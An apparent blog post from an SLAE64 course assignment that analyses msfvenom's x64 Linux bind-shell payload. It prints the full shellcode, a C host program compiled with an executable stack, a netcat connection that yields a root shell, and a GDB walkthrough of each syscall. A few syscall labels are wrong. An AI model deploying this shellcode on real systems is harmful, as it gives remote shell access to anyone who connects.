---
title: SLAE64 Assignment 5 - MSFVenom Bind Shell Analysis
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the fifth assignment of the SLAE64, I analyzed three payloads from msfvenom. This is the third payload, `linux/x64/shell_bind_tcp`.

# Bind Shell Anaylsis
We will be analyzing the msfvenom non-staged bind shell payload. 

## Generating the MSFVenom Payload
Here we generate the payload on Kali Linux and output it to the C format. This allows us to easy add it to our host shellcode.c program.
```bash
root# msfvenom -v shellcode -f c -p linux/x64/shell_bind_tcp
Payload size: 86 bytes
unsigned char shellcode[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
```

## Shellcode.c Host Program
Here we add our shellcode to our C host program. We will compile our host program, and then use GDB for analysis of the non-staged bindshell payload.

```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
int main()
{
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

### Compile & Test Shellcode.c
After executing the host bindshell program, connect to it on TCP port 4444 with a netcat connection.
#### Terminal 1
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# ./shellcode

```

#### Terminal 2
```bash
root# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

## GDB Analysis
### Setup
Here we will start our shellcode with the Gnu Debugger and set a breakpoint on the main function. After the breakpoint is set, we will run the program. 
```bash
root# gdb ./shellcode
GNU gdb (Debian 8.3.1-1) 8.3.1
gdb-peda$ b main
Breakpoint 1 at 0x1129
gdb-peda$ r
```

### Finding shellcode[]
We will use the GDB step-into (`s`) command to move through our program until we reach the point where execution is passed to the shellcode[] array (our non-staged bind shell, shellcode from msfvenom).
```bash
=> 0x555555555141 <main+28>:    call   rdx
gdb-peda$ s
```
+ Step into rdx (shellcode[]).

## Dumping MSFVenom Bind Shell Assembly Instructions
With the instruction pointer (RIP) on the first instruction of `shellcode`, dump the instructions of the entire payload.
```bash
gdb-peda$ x/43i $rip
=> 0x555555558040 <shellcode>:  push   0x29
   0x555555558042 <shellcode+2>:        pop    rax
   0x555555558043 <shellcode+3>:        cdq
   0x555555558044 <shellcode+4>:        push   0x2
   0x555555558046 <shellcode+6>:        pop    rdi
   0x555555558047 <shellcode+7>:        push   0x1
   0x555555558049 <shellcode+9>:        pop    rsi
   0x55555555804a <shellcode+10>:       syscall
   0x55555555804c <shellcode+12>:       xchg   rdi,rax
   0x55555555804e <shellcode+14>:       push   rdx
   0x55555555804f <shellcode+15>:       mov    DWORD PTR [rsp],0x5c110002
   0x555555558056 <shellcode+22>:       mov    rsi,rsp
   0x555555558059 <shellcode+25>:       push   0x10
   0x55555555805b <shellcode+27>:       pop    rdx
   0x55555555805c <shellcode+28>:       push   0x31
   0x55555555805e <shellcode+30>:       pop    rax
   0x55555555805f <shellcode+31>:       syscall
   0x555555558061 <shellcode+33>:       push   0x32
   0x555555558063 <shellcode+35>:       pop    rax
   0x555555558064 <shellcode+36>:       syscall
   0x555555558066 <shellcode+38>:       xor    rsi,rsi
   0x555555558069 <shellcode+41>:       push   0x2b
   0x55555555806b <shellcode+43>:       pop    rax
   0x55555555806c <shellcode+44>:       syscall
   0x55555555806e <shellcode+46>:       xchg   rdi,rax
   0x555555558070 <shellcode+48>:       push   0x3
   0x555555558072 <shellcode+50>:       pop    rsi
   0x555555558073 <shellcode+51>:       dec    rsi
   0x555555558076 <shellcode+54>:       push   0x21
   0x555555558078 <shellcode+56>:       pop    rax
   0x555555558079 <shellcode+57>:       syscall
   0x55555555807b <shellcode+59>:       jne    0x555555558073 <shellcode+51>
   0x55555555807d <shellcode+61>:       push   0x3b
   0x55555555807f <shellcode+63>:       pop    rax
   0x555555558080 <shellcode+64>:       cdq
   0x555555558081 <shellcode+65>:       movabs rbx,0x68732f6e69622f
   0x55555555808b <shellcode+75>:       push   rbx
   0x55555555808c <shellcode+76>:       mov    rdi,rsp
   0x55555555808f <shellcode+79>:       push   rdx
   0x555555558090 <shellcode+80>:       push   rdi
   0x555555558091 <shellcode+81>:       mov    rsi,rsp
   0x555555558094 <shellcode+84>:       syscall
   0x555555558096 <shellcode+86>:       add    BYTE PTR [rax],al
```

## Socket System Call
```bash
<shellcode>:          push   0x29
<shellcode+2>:        pop    rax
<shellcode+3>:        cdq
<shellcode+4>:        push   0x2
<shellcode+6>:        pop    rdi
<shellcode+7>:        push   0x1
<shellcode+9>:        pop    rsi
<shellcode+10>:       syscall
 
```
+ In the first 3 commands we can see that rax is set to 0x29. 
  - This is the system call number for `socket`.
+ `cdq` is used to clear out the `rdx` register 
  - set it to `0x0` aka `NULL`
+ `rdi` is set to `0x2` which is `AF_INET`
+ `rsi` is set to `0x1` which is `SOCK_STREAM`

## Bind System Call
```bash
<shellcode+12>:       xchg   rdi,rax 
```
+ Here we see the socket file descriptor returned from the socket system call, passed to the connect system call.

```bash
<shellcode+14>:       push   rdx
<shellcode+15>:       mov    DWORD PTR [rsp],0x5c110002
<shellcode+22>:       mov    rsi,rsp
<shellcode+25>:       push   0x10
<shellcode+27>:       pop    rdx
<shellcode+28>:       push   0x31
<shellcode+30>:       pop    rax
<shellcode+31>:       syscall

```
+ The dword (4 bytes) of 00's is used for `IPADDR_ANY`
  - `rdx` is `0x0`
  - This means the bind shell will bind to all network interfaces.
+ `0002` is `AF_INET`
+ `5c11` is for TCP Port `4444`
+ `rdx` is equal to the size of the struct. 
  - 16 bytes in decimal, or `0x10` in hex.
+ `0x31` is the system call number for bind.

## Listen System Call
```bash
<shellcode+33>:       push   0x32
<shellcode+35>:       pop    rax
<shellcode+36>:       syscall

```
+ `0x32` is the system call number for bind.
+ `rsi` is for the variable backlog and the value should not really matter.

## Accept System Call
```bash
<shellcode+38>:       xor    rsi,rsi
<shellcode+41>:       push   0x2b
<shellcode+43>:       pop    rax
<shellcode+44>:       syscall
```
+ `rdi` is already set to the socket file descriptor returned from the socket system call.
+ No socket address struct is needed, so `rsi` and `rdx` are set to `0x0`.

## Dup2 Loop
This is the dup2 system call loop to pass standard input, output, and error to the remote connection.
```bash
<shellcode+48>:       push   0x3
<shellcode+50>:       pop    rsi
<shellcode+51>:       dec    rsi
<shellcode+54>:       push   0x21
<shellcode+56>:       pop    rax
<shellcode+57>:       syscall
<shellcode+59>:       jne    <shellcode+51>
 
```
+ `0x21` is the system call for dup2.

## Execve 
Here we see the execve system call which will spawn a shell after establishing a connection.
```bash
<shellcode+61>:       push   0x3b
<shellcode+63>:       pop    rax
<shellcode+64>:       cdq
```
+ set `rax` to the system call number for `execve`.
+ `cdq` clears the `rdx` register.

```bash
RDI: 0x7fffffffe0e8 --> 0x68732f6e69622f ('/bin/sh')

<shellcode+65>:       movabs rbx,0x68732f6e69622f
<shellcode+75>:       push   rbx
<shellcode+76>:       mov    rdi,rsp
<shellcode+79>:       push   rdx
```
+ Here we see `rdi` set to the memory address of the null terminated string `/bin/sh`.

```bash
RSI: 0x7fffffffe0d8 --> 0x7fffffffe0e8 --> 0x68732f6e69622f ('/bin/sh')

<shellcode+80>:       push   rdi
<shellcode+81>:       mov    rsi,rsp
```
+ Here we see `rsi` set to be a pointer to a pointer for the string `/bin/sh`.

```bash
<shellcode+84>:       syscall
<shellcode+86>:       add    BYTE PTR [rax],al
```
+ And finally, this is our bind shell spawning the `/bin/sh` for the connection.

